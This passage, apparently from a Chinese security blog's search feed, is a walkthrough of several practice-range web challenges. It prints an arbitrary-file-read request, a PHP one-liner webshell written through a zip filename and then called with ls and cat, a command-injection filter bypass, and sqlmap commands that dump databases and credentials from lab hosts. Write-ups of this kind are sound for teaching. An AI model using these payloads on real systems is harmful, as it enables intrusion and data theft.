class="subst">$_REQUEST</span>[todir]<span class="subst">$_REQUEST</span>[zipname]&#x27;&gt;<span class="subst">$_REQUEST</span>[todir]<span class="subst">$_REQUEST</span>[zipname] (&quot;</span>.num_bitunit(filesize(<span class="string">&quot;<span class="subst">$_REQUEST</span>[todir]<span class="subst">$_REQUEST</span>[zipname]&quot;</span>)).<span class="string">&quot;)&lt;/a&gt;&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$_REQUEST</span>[todir]<span class="subst">$_REQUEST</span>[zipname] 不能写入,请检查路径或权限是否正确.&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;没有选择的文件或目录.&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">endif</span>;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>审计代码，这里的dfile参数任何的过滤，尝试修改一下dfile的值，惊喜的发现可以读取任意文件，并写入bak_wwwroot.zip，下载bak_wwwroot.zip就可以读取了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dfile[]&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;todir&#x3D;__bak__&amp;zipname&#x3D;bak_wwwroot.zip&amp;password&#x3D;admin888&amp;myaction&#x3D;dozip&amp;Submit&#x3D;+%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD</span><br></pre></td></tr></table></figure>
+
+<p>虽然知道可以读取任意文件，但是不知道key是放在哪个地方，于是这里又卡了一下，但是转头一想，这里是写一个文件名并压缩进文件里面，老CTFer都知道做msic的时候，文件名会写入压缩包里面，于是写一个一句话木马，并把bak_wwwroot.zip改为bak_wwwroot.php试一下，没想到成功了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dfile[]&#x3D;&#x2F;&lt;?php system($_GET[cmd])?&gt;&amp;todir&#x3D;__bak__&amp;zipname&#x3D;bak_wwwroot.php&amp;password&#x3D;admin888&amp;myaction&#x3D;dozip&amp;Submit&#x3D;+%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201028231749399.png" alt="image-20201028231749399"></p>
+<p>读取目录下所有文件目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.3.187.27:41154&#x2F;admin_site_bak2088&#x2F;__bak__&#x2F;bak_wwwroot.php?cmd&#x3D;ls%20..&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>读取key</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.3.187.27:41169&#x2F;admin_K29ke8&#x2F;__bak__&#x2F;bak_wwwroot.php?cmd&#x3D;cat%20&#x2F;key_ss32ce5ew1v.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>数字校园</p>
+<p>提示：浏览器类型要是IPAD，以及要用英文，分辨率要1024*768</p>
+<p>和第一题一样的套路</p>
+<p>不过这里要改下</p>
+<ul>
+<li>Accept-Language为en,zh;q=0.8,en-us;q=0.5,en;q=0.3</li>
+<li>Cookie为screenX=1024; screenY=768</li>
+</ul>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201028233004145.png" alt="image-20201028233004145"></p>
+<h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>网站文件备份服务器</p>
+<p>虽然页面和第二题不同，但是扫目录同样扫出了是一样的后台，爆破弱口令，然后发现admin和admin，剩下的就和之前的步骤是一样的了，写一个马然后读key。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dfile%5B%5D&#x3D;&#x2F;&lt;?php system($_GET[cmd])?&gt;&amp;todir&#x3D;__bak__&amp;zipname&#x3D;bak_wwwroot.php&amp;password&#x3D;admin888&amp;myaction&#x3D;dozip&amp;Submit&#x3D;+%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD</span><br></pre></td></tr></table></figure>
+
+<h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p>教学器械采购平台</p>
+<p>一道命令执行的题，有个输入框</p>
+<p>随便fuzz一下，发现过滤了&amp;&amp;和空格</p>
+<p>于是&amp;&amp;用%26%26替代绕过，空格用&lt;替代绕过</p>
+<p>先用ls读取文件目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iipp&#x3D;127.0.0.1%26%26ls&amp;submit&#x3D;Ping</span><br></pre></td></tr></table></figure>
+
+<p>然后再读取key即可</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201028234949560.png" alt="image-20201028234949560"></p>
+<h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>教学质量评价系统</p>
+<p>发现有个注入点</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.3.177.25:41204&#x2F;show.php?id&#x3D;MQ0&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>测试了一下发现是base64盲注，用tamper指定base64编码，直接丢sqlmap里面跑一下。</p>
+<p>这里要注意的是这个靶场不太稳定，我们用sqlmap有个小问题就是盲注的时候他会根据响应速度来调整发送包的速度，太快了可能网站会崩，所以sqlmap会增加延迟，让他更像是人手工在注入，我觉得慢就断开了，但是如果不清理缓存每次重来就是从上一次继续，所以这里的话加上fresh-queries，再加上batch自动确认。</p>
+<p>跑数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.177.25:41204&#x2F;show.php?id&#x3D;1*  --tamper base64encode.py --dbs --dump --batch --fresh-queries</span><br></pre></td></tr></table></figure>
+
+<p>跑表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.177.25:41204&#x2F;show.php?id&#x3D;1*  --tamper base64encode.py --tables -D test --dump --batch --fresh-queries</span><br></pre></td></tr></table></figure>
+
+<p>跑列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.177.25:41204&#x2F;show.php?id&#x3D;1*  --tamper base64encode.py --columns -D test -T data --dump --batch --fresh-queries</span><br></pre></td></tr></table></figure>
+
+<p>最后payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.177.25:41204&#x2F;show.php?id&#x3D;1*  --tamper base64encode.py -D test -T data -C thekey --dump --batch --fresh-queries</span><br></pre></td></tr></table></figure>
+
+<p>直接跑出key</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201028235959747.png" alt="image-20201028235959747"></p>
+<h3 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h3><p>XWAY科技管理系统</p>
+<p>平台停机维护的通知存在注入，发现注入点在</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.3.225.8:41046&#x2F;new_list.php?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>继续sqlmap跑起来，</p>
+<p>跑数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.225.8:41046&#x2F;new_list.php?id&#x3D;1 --dbs --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p>跑表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.225.8:41046&#x2F;new_list.php?id&#x3D;1 --tables -T member --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p>跑列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.225.8:41046&#x2F;new_list.php?id&#x3D;1 --columns -T member -D stormgroup --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p>最后payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.225.8:41046&#x2F;new_list.php?id&#x3D;1 -D stormgroup -T member -C name,password --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p>跑出两个账号密码</p>
+<ul>
+<li>mozhe/528469</li>
+<li>mozhe/888054</li>
+</ul>
+<p>登录之后，即可拿到key。</p>
+<h3 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h3><p>XWAY电脑采购系统</p>
+<p>随便看了发现到一个注入点</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.3.187.27:41144&#x2F;new_list.php?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>发现是union注入，依旧尝试用sqlmap</p>
+<p>跑数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.187.27:41144&#x2F;new_list.php?id&#x3D;1 --dbs --dump  --batch</span><br></pre></td></tr></table></figure>
+
+<p>跑表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.187.27:41144&#x2F;new_list.php?id&#x3D;1 --tables -D min_ju4t_mel1i --dump  --batch</span><br></pre></td></tr></table></figure>
+
+<p>跑列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.187.27:41144&#x2F;new_list.php?id&#x3D;1 --columns -D min_ju4t_mel1i -T (@dmin9_td4b&#125; --dump  --batch</span><br></pre></td></tr></table></figure>
+
+<p>最后payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;119.3.187.27:41144&#x2F;new_list.php?id&#x3D;1 -D min_ju4t_mel1i -T (@dmin9_td4b&#125; -C username,password --dump  --batch</span><br></pre></td></tr></table></figure>
+
+<p>最后跑出五个账号密码，只有一个能用，md5解密登录拿key。</p>
+<p>sql注入不愧是OWASP TOP 10 之  榜首，10道题目出现了3道，有一说一sqlmap真的是好用。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+  </entry>
 </search>
